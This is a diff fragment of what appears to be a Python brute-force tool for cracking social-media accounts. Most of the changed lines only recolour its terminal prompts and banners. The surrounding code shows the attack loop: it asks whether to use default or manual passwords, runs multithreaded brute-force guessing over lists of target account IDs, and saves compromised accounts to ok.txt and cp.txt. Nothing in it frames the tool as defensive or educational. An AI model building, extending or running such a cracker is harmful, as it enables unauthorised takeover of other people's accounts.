+			print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -1045,7 +1060,7 @@ class crackffb:
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -1057,9 +1072,9 @@ class bapi:
     self.loop = 0
     self.krah(isifile)
   def krah(self,isifile):
-    print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+    print((o+"\n["+p+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+      f=input(o+"["+p+"•"+o+"]"+m+" Choose : ")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
         continue
@@ -1086,7 +1101,7 @@ class bapi:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+        print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1108,7 +1123,7 @@ class bapi:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+        print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1146,7 +1161,7 @@ class bapi:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1167,9 +1182,9 @@ class bapittl:
     self.loop = 0
     self.krah(isifile)
   def krah(self,isifile):
-    print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
+    print((o+"\n["+p+"•"+o+"]"+p+" Crack With Pass Default/Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+      f=input(o+"["+p+"•"+o+"]"+m+" Choose : ")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Invalid Number"))
         continue
@@ -1196,7 +1211,7 @@ class bapittl:
         except Exception as e:
           print(("  %s"%e))
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+        print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         #os.remove(self.apk)
         exit()
@@ -1218,7 +1233,7 @@ class bapittl:
             except:continue
         except:
           continue
-        print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+        print((o+"\n["+p+"•"+o+"]"+p+" Crack Started..."+o+"\n["+p+"•"+o+"]"+p+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+p+" Account [CP] Saved to : cp.txt\n"))
         ThreadPool(30).map(self.brute,self.fl)
         os.remove(self.apk)
         exit()
@@ -1261,7 +1276,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1272,7 +1287,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
 
 ### RESULT ###
 
@@ -1288,7 +1303,7 @@ def results(Dapunta,Krahkrah):
 def ress():
     os.system("clear")
     banner()
-    print((k+"\n[ "+p+"Result Crack"+k+" ]"+p))
+    print((o+"\n[ "+p+"Result Crack"+o+" ]"+p))
     print((h+"\n[ "+p+"OK"+h+" ]"+p))
     try:
         os.system("cat ok.txt")
